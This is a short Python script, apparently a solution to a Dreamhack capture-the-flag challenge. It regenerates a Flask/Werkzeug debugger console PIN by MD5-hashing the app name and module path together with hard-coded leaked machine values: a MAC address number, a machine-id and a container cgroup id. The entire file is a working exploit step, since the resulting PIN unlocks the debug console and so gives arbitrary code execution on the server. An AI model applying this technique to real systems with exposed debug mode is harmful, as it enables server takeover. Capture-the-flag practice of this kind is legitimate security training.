import hashlib
from itertools import chain

probably_public_bits = [
    "dreamhack",
    "flask.app",
    "Flask",
    "/usr/local/lib/python3.8/site-packages/flask/app.py",
]

private_bits = [
    "187999308584705",
    "c31eea55a29431535ff01de94bdcf5cf"
    "libpod-157b2b8af8567f1c71d1edc53e53c4dd4666b8ac2c50c6da2195bcfe50648c67",
]

h = hashlib.md5()

for bit in chain(probably_public_bits, private_bits):
    if bit:
        h.update(bit.encode("utf-8"))

h.update(b"cookiesalt")
h.update(b"pinsalt")

num = ("%09d" % int(h.hexdigest(), 16))[:9]
pin = "-".join(num[i:i + 3] for i in range(0, 9, 3))

print(pin)